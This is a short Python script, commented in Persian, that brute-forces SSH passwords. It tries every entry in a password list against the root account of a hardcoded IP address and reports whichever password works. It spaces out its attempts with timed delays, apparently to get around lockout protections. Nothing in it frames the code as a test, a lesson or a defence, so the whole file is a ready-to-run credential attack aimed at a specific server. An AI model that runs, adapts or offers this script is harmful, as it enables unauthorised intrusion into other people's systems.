import paramiko
import time
from termcolor import colored

# سرور لینوکسی و نام کاربری هدف
server_ip = "185.226.93.166"
username = "root"

# فایل پسورد لیست
password_list_file = "passwords.txt"

# تنظیمات تأخیر
delay_between_attempts = 2  # تأخیر بین هر تلاش (به ثانیه)
delay_after_block = 10  # تأخیر پس از چند تلاش ناموفق (به ثانیه)
attempts_before_delay = 5  # تعداد تلاش‌ها قبل از تأخیر طولانی

def ssh_brute_force(ip, user, password_file):
    with open(password_file, "r") as file:
        passwords = file.readlines()

    attempt_count = 0

    for password in passwords:
        password = password.strip()
        attempt_count += 1

        try:
            # ایجاد SSH client
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh_client.connect(hostname=ip, username=user, password=password, timeout=5)

            print(colored(f"[SUCCESS] Correct password: {password}", "green"))
            ssh_client.close()
            return  # پسورد درست پیدا شد، خارج می‌شویم
        except paramiko.AuthenticationException:
            print(colored(f"[FAILED] Incorrect password: {password}", "red"))
        except paramiko.SSHException as e:
            print(colored(f"[ERROR] SSH issue: {e}", "yellow"))
        except Exception as e:
            print(colored(f"[ERROR] Unexpected issue: {e}", "yellow"))
        finally:
            ssh_client.close()

        # تأخیر بین تلاش‌ها
        time.sleep(delay_between_attempts)

        # تأخیر بیشتر بعد از چند تلاش
        if attempt_count % attempts_before_delay == 0:
            print(colored("[INFO] Too many attempts. Adding a longer delay.", "blue"))
            time.sleep(delay_after_block)

# اجرای برنامه
ssh_brute_force(server_ip, username, password_list_file)
